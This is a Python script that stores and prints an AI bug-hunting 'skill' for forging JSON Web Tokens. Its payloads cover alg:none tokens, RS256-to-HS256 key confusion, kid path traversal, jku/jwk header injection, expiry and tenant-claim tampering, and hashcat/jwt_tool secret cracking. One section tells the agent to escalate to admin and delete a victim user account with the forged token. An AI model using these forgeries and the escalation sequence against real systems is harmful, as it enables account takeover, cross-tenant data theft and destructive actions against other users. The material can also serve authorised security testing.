#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-jwt-crypto

Skill: HUNT-JWT-CRYPTO — Forgeable JSON Web Tokens (A04 Cryptographic Failures)
Desc : Hunt JWT cryptographic failures — alg:none signature-stripping and RS256→HS256 key-confusion that let an attacker forge a token for any identity (e.g. an admin) without knowing a secret. Use when the app authenticates with a JSON Web Token (an `eyJ...` Bearer token in the Authorization header, a cookie, or a login response). This skill OWNS JWT signature/crypto forgery (alg:none, key confusion, kid/jku header injection); hunt-ato covers JWT as one ATO path, hunt-auth-bypass covers SSO/SAML token trust, hunt-api-misconfig covers non-crypto JWT handling. Critical when a forged token grants access to another user's data or an admin-only endpoint.

Run:  python claude-bughunter-hunt-jwt-crypto.py --help
      python claude-bughunter-hunt-jwt-crypto.py --list
      python claude-bughunter-hunt-jwt-crypto.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-jwt-crypto'
TITLE = 'HUNT-JWT-CRYPTO — Forgeable JSON Web Tokens (A04 Cryptographic Failures)'
DESCRIPTION = "Hunt JWT cryptographic failures — alg:none signature-stripping and RS256→HS256 key-confusion that let an attacker forge a token for any identity (e.g. an admin) without knowing a secret. Use when the app authenticates with a JSON Web Token (an `eyJ...` Bearer token in the Authorization header, a cookie, or a login response). This skill OWNS JWT signature/crypto forgery (alg:none, key confusion, kid/jku header injection); hunt-ato covers JWT as one ATO path, hunt-auth-bypass covers SSO/SAML token trust, hunt-api-misconfig covers non-crypto JWT handling. Critical when a forged token grants access to another user's data or an admin-only endpoint."

PAYLOADS = {
    'main': ["name: hunt-jwt-crypto", "description: \"Hunt JWT cryptographic failures \u2014 alg:none signature-stripping and RS256\u2192HS256 key-confusion that let an attacker forge a token for any identity (e.g. an admin) without knowing a secret. Use when the app authenticates with a JSON Web Token (an `eyJ...` Bearer token in the Authorization header, a cookie, or a login response). This skill OWNS JWT signature/crypto forgery (alg:none, key confusion, kid/jku header injection); hunt-ato covers JWT as one ATO path, hunt-auth-bypass covers SSO/SAML token trust, hunt-api-misconfig covers non-crypto JWT handling. Critical when a forged token grants access to another user's data or an admin-only endpoint.\"", "sources: hackerone_public"],
    'hunt-jwt-crypto-forgeable-json-web-tokens-a04-cryptographic-failures': [],
    'what-actually-pays': ["A JWT is `header.payload.signature`, each base64url. The signature is the only", "thing stopping you from editing the payload (your identity/role) and replaying", "it. It pays **High/Critical** when the verifier can be tricked into accepting a", "token you forged \u2014 so you become another user or an admin without their secret.", "Two classic, generic verifier flaws:", "- **`alg:none`** \u2014 the verifier trusts the token's own `alg` header. Set", "`alg:\"none\"`, drop the signature, edit the payload (e.g. `role:\"admin\"`,", "another user's `id`/`email`). A broken verifier skips signature checking.", "- **RS256 \u2192 HS256 key confusion** \u2014 the token is signed RS256 (asymmetric). The", "RSA **public** key is, by definition, public. If the verifier lets you choose", "HS256, it will use that public key as the HMAC *secret* \u2014 which you also know.", "Sign an edited payload with HS256 using the public key and it validates."],
    'recon-is-this-app-jwt-based': ["Login/token responses containing  \"token\":\"eyJ...\"   or  Set-Cookie: token=eyJ...", "Authorization: Bearer eyJ...    on authenticated requests", "A JWKS / public-key endpoint:   /.well-known/jwks.json, /jwks, public-key in the JS bundle", "Decode the header (base64url the first segment). `\"alg\":\"RS256\"` \u2192 try key", "confusion. Any alg \u2192 always try `alg:none` first; it's free."],
    'forging-the-token-never-hand-encode-base64-use-a-jwt-tool': ["Use a purpose-built tool so encoding/signing is correct: **jwt_tool**", "(`jwt_tool <token> -T` to tamper interactively, `-X a` for alg:none, `-X k -pk", "public.pem` for key confusion), Burp's **JWT Editor** extension, or a few lines", "of **PyJWT**. Each forge below is the concept plus the claim to edit.", "**alg:none \u2014 become admin / another user**", "header:    {\"alg\":\"none\",\"typ\":\"JWT\"}", "payload:   {\"data\":{\"id\":1,\"email\":\"admin@target.example\",\"role\":\"admin\"}}", "signature: (empty \u2014 keep the trailing dot:  header.payload. )", "Some verifiers reject lowercase `none` but accept `None`/`NONE`/`nOnE` \u2014 try case variants.", "**RS256 \u2192 HS256 key confusion \u2014 once you have the RSA public key**", "1. Obtain the server's RSA public key as PEM. Sources: /jwks.json or", "/.well-known/jwks.json (convert the JWK to PEM), a public-key file in the JS", "bundle, or recover it from two captured tokens (e.g. jwt_tool / rsa_sign2n).", "2. Re-sign an EDITED payload with HS256, using that PEM as the HMAC secret:", "jwt_tool <token> -X k -pk public.pem", "payload edit:  {\"sub\":\"administrator\"}   (or role:\"admin\" / another user's id)", "**kid header injection \u2014 verifier loads the HMAC key from a FILE named by `kid`**", "header:  {\"alg\":\"HS256\",\"kid\":\"../../../../../../../dev/null\"}", "secret:  \"\"     (contents of /dev/null = empty string \u2192 sign HS256 with an empty secret)", "payload: {\"sub\":\"administrator\"}", "Traverse out of the keys directory first. `kid` can also carry SQLi / command", "injection / SSRF if the key lookup hits a DB / shell / URL \u2014 same idea: `kid` is", "attacker-controlled and reaches a dangerous sink.", "**jku / x5u header injection (RS256) \u2014 verifier fetches the public key from a URL in the token**", "1. Host a JWKS containing a public key you control, on a server the verifier can reach.", "2. Set the token's `jku` (or `x5u`) header to that URL and sign the edited payload", "with YOUR matching private key.", "3. If the verifier allowlists jku hosts, chain an open-redirect or SSRF-reachable", "path on the target's OWN domain so the fetch resolves to your JWKS.", "**jwk header self-signed key injection (RS256) \u2014 embed an attacker-controlled public key in the token**", "header:  {\"alg\":\"RS256\",\"jwk\":{\"kty\":\"RSA\",\"n\":\"<your_rsa_modulus>\",\"e\":\"AQAB\"}}", "payload: {\"sub\":\"administrator\"}", "signature: (sign with your matching private key)", "Some verifiers incorrectly trust a `jwk` (JSON Web Key) claim in the header and use it to validate the signature. Generate your own RSA keypair, embed the public key in the token header, sign with your private key, and send. Works when the verifier does not verify the key's provenance or allowlist.", "**Expiry / time-based claim manipulation**", "Remove \"exp\" (expiration) claim entirely \u2014 many validators skip the check if absent.", "Or set \"nbf\" (not before) to the past and \"exp\" (expiration) to far future (e.g. year 2099).", "Edit payload: {\"sub\":\"administrator\",\"nbf\":1000000000,\"exp\":4102444800}", "Combined with any forging technique above (alg:none, key confusion, jwk injection), this", "bypasses time-based validation when the verifier does not enforce strict expiry rules.", "**Cross-tenant claim injection \u2014 escalate to another tenant's data via claim swaps**", "Identify tenant-related claims in a decoded real token: \"org_id\", \"tenant\", \"account_id\",", "\"workspace_id\", \"customer_id\". Edit the target claim to another tenant's value.", "Example: {\"sub\":\"victim@org.com\",\"org_id\":1234} \u2192 change org_id to an admin's org (e.g. 9999).", "This is systematic IDOR via claims \u2014 if authorization logic trusts the token claims", "without checking ownership server-side, you cross into another tenant's resources.", "Works especially well combined with alg:none or weak-secret attacks.", "Match the `payload` shape to a REAL token from the app (decode one first) \u2014 keep", "its claim names, only change identity/role. A payload the app can't parse fails", "for the wrong reason and wastes the attempt."],
    'offline-attacks-weak-hmac-secret-cracking': ["If the token is HS256 (HMAC-based) and the secret is weak or reused from a known", "password list:", "```bash"],
    'hashcat-mode-16500-jwt': ["hashcat -a 0 -m 16500 <jwt_file> rockyou.txt"],
    'jwt-tool-built-in-wordlist-cracking': ["jwt_tool <token> -C -d wordlist.txt", "Once the secret is cracked, forge any token using HS256 with that secret (via", "jwt_tool or PyJWT)."],
    'automated-attack-automation': ["Use purpose-built JWT attack suites to run all known forgery modes in parallel:", "```bash"],
    'jwt-tool-auto-try-alg-none-key-confusion-kid-injection-etc': ["jwt_tool <token> -X a"],
    'nuclei-automated-jwt-vuln-scanning': ["nuclei -u <target_url> -t jwt/ -timeout 10s", "Run these early in JWT recon; they often find the vulnerability faster than", "manual chaining of individual techniques."],
    'drive-to-the-admin-objective-do-not-stop-at-a-working-forge': ["A forge that loads YOUR own `/my-account` is NOT the goal \u2014 it just proves the", "forge mechanism works. The objective is almost always **admin** (reach an", "admin-only page and perform an admin action, e.g. delete a user). Once any forge", "is accepted, IMMEDIATELY escalate \u2014 change identity to admin AND aim at the admin", "endpoint. Do not keep re-forging `/my-account` or re-logging-in; that is drift.", "Fixed escalation sequence (run it in order, do not loop on earlier steps):", "1. Forge admin identity and hit the admin page (try these claim names \u2014 match a", "decoded real token: `sub`, `role`, `isAdmin`, `username`), e.g. an HS256 token", "with `kid` pointed at `/dev/null` and an empty secret, payload `{\"sub\":\"administrator\"}`,", "sent to `GET /admin`.", "2. When `/admin` returns 200 (you'll see admin controls / a delete link), perform", "the admin action with the SAME forged token \u2014 a typical one is deleting a", "target user account, e.g. `GET /admin/delete?username=<victimuser>` (some apps", "use `POST /admin/delete` \u2014 read the admin page for the exact form/verb).", "A 401 on `/admin` means the forge/claim is wrong \u2014 change ONE thing (the kid", "depth, the claim name/value, or alg) and retry `/admin`. Never retreat to a bare", "unauthenticated `GET /admin` (no token) \u2014 that always 401s and wastes effort."],
    'proof-of-impact': ["Point the forged token at a protected/admin endpoint and prove you read data you", "should not: an account/user listing (multiple users' emails), another user's", "object, or a completed admin action (the deleted-user confirmation). Reading the", "admin user list or performing the admin action with a forged token IS the exploit.", "A 200 that returns only your own data, or a 401, is not proof."],
    'validation-discipline': ["- Decode and confirm the token you sent actually carries the edited claims.", "- The win is **cross-identity data access**, not merely a 200. Show the foreign", "user data (e.g. other users' emails) in the response.", "- `alg:none` rejected (401) just means that flaw is patched \u2014 try key confusion", "before concluding the app is safe."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()